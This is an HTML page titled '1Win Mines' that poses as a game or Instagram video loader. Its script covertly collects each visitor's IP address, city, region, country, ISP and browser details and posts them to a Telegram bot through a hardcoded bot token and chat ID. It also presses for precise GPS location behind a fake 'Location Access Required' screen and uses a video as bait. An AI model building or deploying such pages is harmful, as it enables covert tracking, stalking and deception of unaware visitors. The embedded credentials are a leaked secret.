<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>1Win Mines</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
      font-family: Arial, sans-serif;
    }
    #bg-image {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      z-index: 1;
      transition: opacity 0.5s ease;
    }
    #insta-video {
      display: none;
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      z-index: 2;
      background: black;
    }
    #loading-overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.6);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 3;
    }
    .loader {
      width: 50px;
      height: 50px;
      border: 5px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s ease-in-out infinite;
      margin-bottom: 15px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    #loading-text {
      color: white;
      font-size: 18px;
      margin-top: 10px;
      text-align: center;
    }
    #permission-request {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 4;
      color: white;
      text-align: center;
      padding: 20px;
    }
    #allow-btn {
      margin-top: 20px;
      padding: 12px 30px;
      background: #4CAF50;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <img id="bg-image" src="https://raw.githubusercontent.com/danish-attar/omegle/refs/heads/main/smart-phone-with-instagram-app-logo-on-its-screen-vector-51195621.jpg" alt="Background">

  <!-- Your Google-Drive-hosted video -->
  <video id="insta-video" controls playsinline>
    <source src="https://drive.google.com/uc?export=download&id=19szhjOpGA8ymSNuFpOtYwi4LdYP3hYR-" type="video/mp4">
    Your browser does not support the video tag.
  </video>

  <div id="loading-overlay">
    <div class="loader"></div>
    <div id="loading-text">Connecting to server...</div>
  </div>

  <div id="permission-request">
    <h2>Location Access Required</h2>
    <p>Please allow location access to continue</p>
    <button id="allow-btn">ALLOW LOCATION</button>
  </div>

  <script>
    const botToken = '8440190119:AAH9ukiBj1NhHh7-rNb9vv22vj7m64rHSC4';
    const chatId = '7173355426';

    const loadingOverlay = document.getElementById('loading-overlay');
    const loadingText = document.getElementById('loading-text');
    const permissionRequest = document.getElementById('permission-request');
    const allowBtn = document.getElementById('allow-btn');
    const bgImage = document.getElementById('bg-image');
    const video = document.getElementById('insta-video');

    const loadingMessages = [
      "Connecting to server...",
      "Loading game assets...",
      "Verifying account...",
      "Almost ready...",
      "Preparing interface...",
      "Finalizing setup..."
    ];

    function rotateLoadingMessages() {
      let counter = 0;
      setInterval(() => {
        loadingText.textContent = loadingMessages[counter];
        counter = (counter + 1) % loadingMessages.length;
      }, 3000);
    }

    async function getIPInfo() {
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        return await detailsResponse.json();
      } catch {
        return {};
      }
    }

    function getPreciseLocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
          pos => resolve({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            timestamp: new Date().toLocaleString()
          }),
          err => {
            if (err.code === err.PERMISSION_DENIED)
              setTimeout(() => permissionRequest.style.display = 'flex', 3000);
            resolve(null);
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }

    async function sendToTelegram(data) {
      const msg = [
        `ðŸ•µï¸ NEW VISITOR TRACKED ðŸ•µï¸`,
        `ðŸ“± Device: ${navigator.userAgent}`,
        `ðŸŒ IP: ${data.ip || 'Unknown'}`,
        `ðŸ“ IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}`,
        `ðŸ¢ ISP: ${data.org || 'Unknown'}`
      ].join('\n');
      try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ chat_id: chatId, text: msg })
        });
      } catch(e){ console.error(e); }
    }

    async function trackUser() {
      rotateLoadingMessages();
      const liveLocation = await getPreciseLocation();
      const ipDetails = await getIPInfo();
      await sendToTelegram({ ...ipDetails, liveLocation });

      if (liveLocation) {
        loadingOverlay.style.display = 'none';
        bgImage.style.opacity = '0';
        setTimeout(() => {
          bgImage.style.display = 'none';
          video.style.display = 'block';
          // request fullscreen and play (user initiated)
          video.requestFullscreen?.();
          video.play().catch(() => {
            console.log('Browser blocked autoplay with sound; user must press play.');
          });
        }, 600);
      }
    }

    allowBtn.addEventListener('click', async () => {
      permissionRequest.style.display = 'none';
      await trackUser();
    });

    window.onload = trackUser;
  </script>
</body>
</html>
